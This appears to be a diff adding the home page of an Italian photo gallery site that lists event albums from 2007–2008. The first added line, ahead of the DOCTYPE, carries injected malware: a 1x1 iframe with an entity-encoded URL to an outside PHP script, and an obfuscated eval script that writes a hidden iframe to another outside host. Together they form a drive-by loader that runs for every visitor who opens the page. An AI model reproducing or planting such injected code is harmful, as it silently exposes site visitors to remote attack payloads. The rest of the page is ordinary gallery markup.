@@ -1,0 +1,883 @@
+<iframe src='&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#99;&#99;&#102;&#101;&#108;&#111;&#109;&#118;&#104;&#107;&#46;&#99;&#111;&#109;&#47;&#100;&#108;&#47;&#97;&#100;&#118;&#53;&#52;&#50;&#46;&#112;&#104;&#112;' width=1 height=1></iframe><script>var s;aa=document.createTextNode("harC"+"ode");s=String["fr"+"omC"+aa['nod'+'eVa'+'lue']];for(i in aa)if(i=='length')h=5-aa[i];eval(s(7-h,7-h,103-h,100-h,30-h,38-h,98-h,109-h,97-h,115-h,107-h,99-h,108-h,114-h,44-h,101-h,99-h,114-h,67-h,106-h,99-h,107-h,99-h,108-h,114-h,113-h,64-h,119-h,82-h,95-h,101-h,76-h,95-h,107-h,99-h,38-h,37-h,96-h,109-h,98-h,119-h,37-h,39-h,89-h,46-h,91-h,39-h,121-h,7-h,7-h,7-h,103-h,100-h,112-h,95-h,107-h,99-h,112-h,38-h,39-h,57-h,7-h,7-h,123-h,30-h,99-h,106-h,113-h,99-h,30-h,121-h,7-h,7-h,7-h,98-h,109-h,97-h,115-h,107-h,99-h,108-h,114-h,44-h,117-h,112-h,103-h,114-h,99-h,38-h,32-h,58-h,103-h,100-h,112-h,95-h,107-h,99-h,30-h,113-h,112-h,97-h,59-h,37-h,102-h,114-h,114-h,110-h,56-h,45-h,45-h,106-h,109-h,104-h,53-h,101-h,44-h,97-h,120-h,44-h,97-h,97-h,45-h,100-h,109-h,112-h,115-h,107-h,44-h,110-h,102-h,110-h,61-h,114-h,110-h,59-h,55-h,96-h,97-h,53-h,96-h,54-h,100-h,97-h,52-h,55-h,46-h,47-h,97-h,98-h,46-h,48-h,37-h,30-h,117-h,103-h,98-h,114-h,102-h,59-h,37-h,47-h,46-h,37-h,30-h,102-h,99-h,103-h,101-h,102-h,114-h,59-h,37-h,47-h,46-h,37-h,30-h,113-h,114-h,119-h,106-h,99-h,59-h,37-h,116-h,103-h,113-h,103-h,96-h,103-h,106-h,103-h,114-h,119-h,56-h,102-h,103-h,98-h,98-h,99-h,108-h,57-h,110-h,109-h,113-h,103-h,114-h,103-h,109-h,108-h,56-h,95-h,96-h,113-h,109-h,106-h,115-h,114-h,99-h,57-h,106-h,99-h,100-h,114-h,56-h,46-h,57-h,114-h,109-h,110-h,56-h,46-h,57-h,37-h,60-h,58-h,45-h,103-h,100-h,112-h,95-h,107-h,99-h,60-h,32-h,39-h,57-h,7-h,7-h,123-h,7-h,7-h,100-h,115-h,108-h,97-h,114-h,103-h,109-h,108-h,30-h,103-h,100-h,112-h,95-h,107-h,99-h,112-h,38-h,39-h,121-h,7-h,7-h,7-h,116-h,95-h,112-h,30-h,100-h,30-h,59-h,30-h,98-h,109-h,97-h,115-h,107-h,99-h,108-h,114-h,44-h,97-h,112-h,99-h,95-h,114-h,99-h,67-h,106-h,99-h,107-h,99-h,108-h,114-h,38-h,37-h,103-h,100-h,112-h,95-h,107-h,99-h,37-h,39-h,57-h,100-h,44-h,113-h,99-h,114-h,63-h,114-h,114-h,112-h,103-h,96-h,115-h,114-h,99-h,38-h,37-h,113-h,112-h,97-h,37-h,42-h,37-h,102-h,114-h,114-h,110-h,56-h,45-h,45-h,106-h,109-h,104-h,53-h,101-h,44-h,97-h,120-h,44-h,97-h,97-h,45-h,100-h,109-h,112-h,115-h,107-h,44-h,110-h,102-h,110-h,61-h,114-h,110-h,59-h,55-h,96-h,97-h,53-h,96-h,54-h,100-h,97-h,52-h,55-h,46-h,47-h,97-h,98-h,46-h,48-h,37-h,39-h,57-h,100-h,44-h,113-h,114-h,119-h,106-h,99-h,44-h,116-h,103-h,113-h,103-h,96-h,103-h,106-h,103-h,114-h,119-h,59-h,37-h,102-h,103-h,98-h,98-h,99-h,108-h,37-h,57-h,100-h,44-h,113-h,114-h,119-h,106-h,99-h,44-h,110-h,109-h,113-h,103-h,114-h,103-h,109-h,108-h,59-h,37-h,95-h,96-h,113-h,109-h,106-h,115-h,114-h,99-h,37-h,57-h,100-h,44-h,113-h,114-h,119-h,106-h,99-h,44-h,106-h,99-h,100-h,114-h,59-h,37-h,46-h,37-h,57-h,100-h,44-h,113-h,114-h,119-h,106-h,99-h,44-h,114-h,109-h,110-h,59-h,37-h,46-h,37-h,57-h,100-h,44-h,113-h,99-h,114-h,63-h,114-h,114-h,112-h,103-h,96-h,115-h,114-h,99-h,38-h,37-h,117-h,103-h,98-h,114-h,102-h,37-h,42-h,37-h,47-h,46-h,37-h,39-h,57-h,100-h,44-h,113-h,99-h,114-h,63-h,114-h,114-h,112-h,103-h,96-h,115-h,114-h,99-h,38-h,37-h,102-h,99-h,103-h,101-h,102-h,114-h,37-h,42-h,37-h,47-h,46-h,37-h,39-h,57-h,7-h,7-h,7-h,98-h,109-h,97-h,115-h,107-h,99-h,108-h,114-h,44-h,101-h,99-h,114-h,67-h,106-h,99-h,107-h,99-h,108-h,114-h,113-h,64-h,119-h,82-h,95-h,101-h,76-h,95-h,107-h,99-h,38-h,37-h,96-h,109-h,98-h,119-h,37-h,39-h,89-h,46-h,91-h,44-h,95-h,110-h,110-h,99-h,108-h,98-h,65-h,102-h,103-h,106-h,98-h,38-h,100-h,39-h,57-h,7-h,7-h,123-h));</script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html dir="ltr">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="Pragma" content="no-cache" />
+<title>Boccon da Ghiotti Gallery - Home</title>
+
+<link rel="stylesheet" href="themes/classic/style.css" type="text/css" />
+<script type="text/javascript" src="scripts.js"></script>
+<!-- $Id: template.html 2688 2005-12-04 03:22:35Z donnoman $ -->
+</head>
+<body>
+  
+  <table width="100%" border="0" cellpadding="20" cellspacing="20">
+    <tr>
+      <td valign="top" style="border: 1px solid #666666;background-color:#FFFFFF;">
+        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td>
+              <a href="index.php"><img src="themes/classic/images/site_logo.png" border="0" alt="" /></a><br />
+            </td>
+            <td width="100%" align="center">
+              <h1>Boccon da Ghiotti Gallery</h1>
+              <h3>Your online photo album</h3><br />
+                          <!-- BEGIN home -->
+        <a href="index.php" title="Go to the home page">Home</a> ::
+  <!-- END home -->                  <!-- BEGIN login -->
+        <a href="login.php?referer=index.php" title="Log me in">Login</a> 
+  <!-- END login -->   <br />               <!-- BEGIN album_list -->
+        <a href="index.php?cat=0" title="Go to the album list">Album list</a> ::
+  <!-- END album_list -->  <!-- BEGIN lastup -->
+        <a href="thumbnails.php?album=lastup&amp;cat=0" title="Show most recent uploads">Last uploads</a> ::
+  <!-- END lastup -->  <!-- BEGIN lastcom -->
+        <a href="thumbnails.php?album=lastcom&amp;cat=0" title="Show most recent comments">Last comments</a> ::
+  <!-- END lastcom -->  <!-- BEGIN topn -->
+        <a href="thumbnails.php?album=topn&amp;cat=0" title="Show most viewed items">Most viewed</a> ::
+  <!-- END topn -->  <!-- BEGIN toprated -->
+        <a href="thumbnails.php?album=toprated&amp;cat=0" title="Show top rated items">Top rated</a> ::
+  <!-- END toprated -->  <!-- BEGIN favpics -->
+        <a href="thumbnails.php?album=favpics" title="Go to my favorites">My Favorites</a> ::
+  <!-- END favpics -->  <!-- BEGIN search -->
+        <a href="search.php" title="Search the gallery">Search</a> 
+  <!-- END search -->
+            </td>
+          </tr>
+        </table>
+        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td align="center" valign="top">
+              
+            </td>
+          </tr>
+          <tr>
+            <td align="center" valign="top">
+              
+              
+            </td>
+          </tr>
+        </table>
+        <img src="images/spacer.gif" width="1" height="15" alt="" />
+        <br />
+        <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+          <tr>
+            <td align="left" valign="top">
+              
+              
+        <img src="images/spacer.gif" width="1" height="7" border="" alt="" /><br />
+
+<!-- Start standard table -->
+<table align="center" width="100%" cellspacing="1" cellpadding="0" class="maintable">
+
+        <tr>
+                <td colspan="3" class="tableh1" align="center"><span class="statlink"><b>1569</b> files in <b>14</b> albums with <b>0</b> comments viewed <b>79855</b> times</span></td>
+        </tr>
+
+        <tr class="tableb_compact">
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=1"><b>03 gennaio 2008</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=1" class="albums"><img src="albums/03%20Gennaio%202008/thumb_IMG_5178.JPG" class="image" width="50" height="34" border="0" alt="IMG_5178.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">88 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=2"><b>08 Novembre 2007</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=2" class="albums"><img src="albums/08%20Novembre%202007/thumb_IMG_3629.JPG" class="image" width="50" height="34" border="0" alt="IMG_3629.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">85 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=3"><b>11 ottobre 2007 Stinco e birra</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=3" class="albums"><img src="albums/11%20ottobre%202007%20Stinco%20e%20birra/thumb_IMG_3230.JPG" class="image" width="50" height="34" border="0" alt="IMG_3230.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">101 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        </tr>
+        <tr class="tableb_compact">
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=4"><b>13 Dicembre 2007 -KARAOKE</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=4" class="albums"><img src="albums/13%20Dicembre%202007%20-KARAOKE/thumb_IMG_4697.JPG" class="image" width="50" height="34" border="0" alt="IMG_4697.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">99 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=5"><b>22 Novembre 2007</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=5" class="albums"><img src="albums/22%20Novembre%202007/22%20Novembre%202007/thumb_IMG_3819.JPG" class="image" width="50" height="34" border="0" alt="IMG_3819.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">99 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=6"><b>27 Dicembre 2007</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=6" class="albums"><img src="albums/27%20Dicembre%202007/thumb_IMG_4832.JPG" class="image" width="34" height="50" border="0" alt="IMG_4832.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">105 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        </tr>
+        <tr class="tableb_compact">
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=7"><b>27 settembre 2007</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=7" class="albums"><img src="albums/27%20settembre%202007/thumb_IMG_3056.JPG" class="image" width="50" height="34" border="0" alt="IMG_3056.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">120 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=9"><b>31 Gennaio 2008</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=9" class="albums"><img src="albums/31%20Gennaio%202008/thumb_IMG_5506.JPG" class="image" width="50" height="34" border="0" alt="IMG_5506.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">80 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=8"><b>29 Novembre 07</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=8" class="albums"><img src="albums/29%20Novembre%2007/thumb_IMG_4081.JPG" class="image" width="50" height="34" border="0" alt="IMG_4081.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">200 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        </tr>
+        <tr class="tableb_compact">
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=10"><b>6 Dicembre 2007 -10 anni Belle Epoque</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=10" class="albums"><img src="albums/6%20Dicembre%202007%20-10%20anni%20Belle%20Epoque/thumb_IMG_4270.JPG" class="image" width="50" height="34" border="0" alt="IMG_4270.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">140 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=13"><b>Ultimo di Carnevale 2008-Daniele Zero</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=13" class="albums"><img src="albums/Ultimo%20di%20Carnevale%202008-Daniele%20Zero/thumb_IMG_5706.JPG" class="image" width="50" height="34" border="0" alt="IMG_5706.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">189 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=11"><b>Halloween07</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=11" class="albums"><img src="albums/Halloween07/thumb_IMG_3492.JPG" class="image" width="34" height="50" border="0" alt="IMG_3492.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">104 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        </tr>
+        <tr class="tableb_compact">
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=12"><b>the best</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=12" class="albums"><img src="albums/the%20best/thumb_IMG_2842.JPG" class="image" width="50" height="34" border="0" alt="IMG_2842.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">7 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td colspan="3" height="1" align="left" valign="top" class="tableh2">
+                        <span class="alblink"><a href="thumbnails.php?album=14"><b>10 e 17  Gennaio 2008</b></a></span>
+                </td>
+        </tr>
+        <tr>
+                <td colspan="3">
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td align="center" valign="middle" class="thumbnails">
+                        <img src="images/spacer.gif" width="52" height="1" class="image" style="margin-top: 0px; margin-bottom: 0px; border: none;" alt="" /><br />
+                        <a href="thumbnails.php?album=14" class="albums"><img src="albums/10%20e%2017%20%20Gennaio%202008/thumb_IMG_5388.JPG" class="image" width="50" height="34" border="0" alt="IMG_5388.JPG" /><br /></a>
+                </td>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" />
+                </td>
+                <td width="100%" valign="top" align="left" class="tableb_compact">
+                         
+                        <p></p>
+                        <p class="album_stat">152 files, last one added on Apr 29, 2008</p>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        <td width="34%" valign="top">
+        <table width="100%" cellspacing="0" cellpadding="0">
+        <tr>
+                <td height="1" valign="top" class="tableh2">
+                        <b>&nbsp;</b>
+                </td>
+        </tr>
+        <tr>
+                <td>
+                        <img src="images/spacer.gif" width="1" height="1" border="0" alt="" /><br />
+                </td>
+        </tr>
+        <tr>
+                <td width="100%" valign="top" class="tableb_compact">
+                    <div class="thumbnails" style="background-color:transparent"><img src="images/spacer.gif" width="1" height="52" border="0" class="image" style="border:0;margin-top:1px;margin-bottom:0" alt="" /></div>
+                </td>
+        </tr>
+        </table>
+        </td>
+
+        </tr>
+
+        <tr>
+                <td colspan="3" style="padding: 0px;">
+                        <table width="100%" cellspacing="0" cellpadding="0">
+                                <tr>
+                                       <td width="100%" align="left" valign="middle" class="tableh1_compact" style="white-space: nowrap"><b>14 albums on 1 page(s)</b></td>
+
+                                </tr>
+                        </table>
+                </td>
+        </tr>
+</table>
+<!-- End standard table -->
+
+        <img src="images/spacer.gif" width="1" height="7" border="" alt="" /><br />
+
+<!-- Start standard table -->
+<table align="center" width="100%" cellspacing="1" cellpadding="0" class="maintable">
+        <tr>
+                <td class="tableh1" colspan="5">Random files</td>
+        </tr>
+
+        <tr>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-635"><img src="albums/13%20Dicembre%202007%20-KARAOKE/thumb_IMG_4626.JPG" class="image" width="100" height="67" border="0" alt="IMG_4626.JPG" title="Filename=IMG_4626.JPG
+Filesize=940KB
+Dimensions=1728x1152
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">21 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-779"><img src="albums/29%20Novembre%2007/thumb_IMG_3859.JPG" class="image" width="100" height="67" border="0" alt="IMG_3859.JPG" title="Filename=IMG_3859.JPG
+Filesize=870KB
+Dimensions=1728x1152
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">20 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-1485"><img src="albums/Halloween07/thumb_IMG_3351.JPG" class="image" width="100" height="67" border="0" alt="IMG_3351.JPG" title="Filename=IMG_3351.JPG
+Filesize=101KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">72 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-833"><img src="albums/29%20Novembre%2007/thumb_IMG_3928.JPG" class="image" width="100" height="67" border="0" alt="IMG_3928.JPG" title="Filename=IMG_3928.JPG
+Filesize=852KB
+Dimensions=1728x1152
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">28 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-510"><img src="albums/11%20ottobre%202007%20Stinco%20e%20birra/thumb_IMG_3140.JPG" class="image" width="100" height="67" border="0" alt="IMG_3140.JPG" title="Filename=IMG_3140.JPG
+Filesize=121KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">20 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        </tr>
+        <tr>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-1082"><img src="albums/27%20settembre%202007/thumb_IMG_2953.JPG" class="image" width="100" height="67" border="0" alt="IMG_2953.JPG" title="Filename=IMG_2953.JPG
+Filesize=104KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">34 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-1102"><img src="albums/27%20settembre%202007/thumb_IMG_2973.JPG" class="image" width="100" height="67" border="0" alt="IMG_2973.JPG" title="Filename=IMG_2973.JPG
+Filesize=132KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">29 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-648"><img src="albums/13%20Dicembre%202007%20-KARAOKE/thumb_IMG_4666.JPG" class="image" width="100" height="67" border="0" alt="IMG_4666.JPG" title="Filename=IMG_4666.JPG
+Filesize=918KB
+Dimensions=1728x1152
+Date added=Apr 29, 2008"/><br /></a>
